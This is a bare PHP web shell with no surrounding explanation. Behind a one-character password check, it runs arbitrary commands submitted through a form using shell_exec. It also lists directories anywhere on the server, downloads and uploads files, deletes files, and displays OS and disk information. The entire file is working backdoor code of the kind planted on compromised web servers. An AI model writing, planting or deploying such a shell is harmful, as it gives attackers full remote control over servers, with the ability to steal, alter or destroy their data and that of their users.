<?php
$psw = '3';
$bse = '/' . basename(__FILE__) . '?p=' . $psw . '&XDIR=';
$dir = isset($_GET["XDIR"])?empty($_GET["XDIR"])?"/":$_GET["XDIR"]:"./";
$pss = isset($_GET["p"])?($_GET["p"]==$psw)?"":header("Location: /"): header("Location: /");
if (isset($_GET['d'])) {
	$file = $dir.'/'.$_GET['d'];
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
} else { ?>
	<form method="POST" enctype="multipart/form-data">
		<input type="text" name="c" placeholder="enter command here..." />
		<input type="file" name="u" />
		<input type="submit" />
	</form><br/>
	<code><hr/>
<?php
	if (!empty($_POST['c'])) {
		echo '<i>'.$_POST['c'].'</i><hr/>';
		$output = shell_exec($_POST['c']) ;
		echo '<pre>'.$output.'</pre><hr/>';
	} ?>
		OS: <?=php_uname();?><br/><hr/>
		Disk Totol: <?=(disk_total_space("/"))/(1024*1024*1024);?> GB | <?=(disk_total_space("/"));?> bytes <br/>
		Disk Free : <?=(disk_free_space("/"))/(1024*1024*1024);?> GB | <?=(disk_free_space("/"));?> bytes <br/>
		Disk Used : <?=(disk_total_space("/")-disk_free_space("/"))/(1024*1024*1024);?> GB | <?=(disk_total_space("/")-disk_free_space("/"));?> bytes <br/><hr/> |
		<a href="<?=$bse . explode("/", $_SERVER['DOCUMENT_ROOT'])[0];?>/">Root(/)</a> |
		<a href="<?=$bse . join("/", array_slice(explode("/", $dir),0,-2));?>/">Previous(../)</a> |
		<a href="<?=$bse;?>./">Home (./)</a> | <a href="<?=$bse.$dir;?>">Refreash (#)</a> | <br/><hr/>
<?php
	if (is_dir($dir.'/')) {
		if ($dh = opendir($dir.'/')) {
			while (($file = readdir($dh)) !== false) {
				try {
					$ft = filetype( $dir . '/' . $file );
				} catch (Exception $e) {
					$ft = 'xxxx';
				} if ( $ft=='file' ) {
					echo '| <a href="' . $bse . $dir . '&r=' . $file . '">x</a> | ' . $ft . ' | <a href="' . $bse . $dir . '&d=' . $file . '" target="_blank">' . $file . '</a> <br />';
				} else if ( $file=='.' or $file=='..' ) {
				} else if ( $ft=='link' ) {
					echo '| <a href="' . $bse . $dir . '&r=' . $file . '">x</a> | ' . $ft . ' | <a href="' . $bse . $dir . $file . '">' . $file . '</a> <br />';
				} else if ( $ft=='dir' ) {
					echo '| <a href="' . $bse . $dir . '&r=' . $file . '">x</a> | #' . $ft . ' | <a href="' . $bse . $dir . $file . '/">' . $file . '</a> <br />';
				} else {
					echo '| <a href="' . $bse . $dir . '&r=' . $file . '">x</a> | ' . $ft . ' | <a href="' . $bse . $dir . $file . '">' . $file . '</a> <br />';
				}
			}
			closedir($dh);
		}
		echo '</code>';
	} if (isset($_FILES['u'])) {
		$p = ($_FILES['u']["name"]);
		$tf = $dir .'/'. basename($_FILES['u']["name"]);
		move_uploaded_file($_FILES['u']["tmp_name"], $tf);
	} if (isset($_GET['r'])) {
		$file = $dir .'/'. $_GET['r'];
		unlink($file);
		header('Location: ' . $_SERVER['HTTP_REFERER']);
	}
} ?>